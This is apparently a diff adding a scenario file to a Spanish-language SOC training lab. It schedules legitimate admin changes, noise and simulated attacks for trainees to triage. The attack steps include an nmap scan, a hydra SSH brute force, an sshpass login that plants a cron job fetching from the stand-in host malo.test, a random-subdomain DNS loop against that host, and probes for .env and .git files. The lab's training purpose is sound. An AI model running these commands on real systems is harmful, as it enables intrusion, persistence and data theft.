@@ -1,0 +1,24 @@
+# =============================================================================
+#  soc-lab · ./lab.sh turno · lo que pasa en Hackerlab Logística durante tu turno
+#
+#  Formato:  espera_en_segundos|servicio|comando
+#    - servicio "replay": reproduce ese escenario de Windows (./lab.sh replay)
+#    - cualquier otro: ejecuta el comando con "sh -c" dentro de ese contenedor
+#  Reglas para escribir pasos: un paso por línea, sin comillas dobles (para que
+#  funcione igual desde PowerShell) y sin espacios alrededor de las barras.
+#
+#  ¡SPOILER! Si vas a hacer el ejercicio del turno, no leas lo que hay debajo.
+#  Mezcla a propósito ataques reales, cambios legítimos de los administradores y
+#  ruido: tu trabajo es separarlos, escalar lo que toca y escribir la nota de relevo.
+# =============================================================================
+10|srv-web|echo '<!-- CHG-2041 banner de Navidad (cambio aprobado) -->' >> /usr/share/nginx/html/index.html
+30|attacker|nmap -sT -p 21,22,80,443,3128 172.30.10.10 172.30.10.11
+40|srv-ssh|su - mgarcia -c 'echo Cambi4Esto!2026 | sudo -S -p sudo: id'
+40|replay|password-spray
+30|attacker|hydra -t 4 -l soporte -P /root/wordlists/passwords.txt ssh://172.30.10.11
+20|attacker|sshpass -p sunshine ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null soporte@172.30.10.11 'id; uname -a; sudo -n true; echo \*/5 \* \* \* \* curl -s http://malo.test/c > /tmp/.c; crontab /tmp/.c; rm -f /tmp/.c'
+30|replay|admin-group
+30|attacker|for i in $(seq 1 40); do dig +short +tries=1 +time=1 $(head -c 30 /dev/urandom | od -An -tx1 | tr -d ' \n').malo.test >/dev/null; done
+30|srv-ssh|id practicas >/dev/null 2>&1 || useradd -m -c CHG-2042 practicas
+20|attacker|for p in admin.php wp-login.php .env .git/config backup.zip phpmyadmin/ server-status; do curl -sk -o /dev/null -A Nikto/2.5.0 https://172.30.10.10/$p; done
+20|replay|remote-service
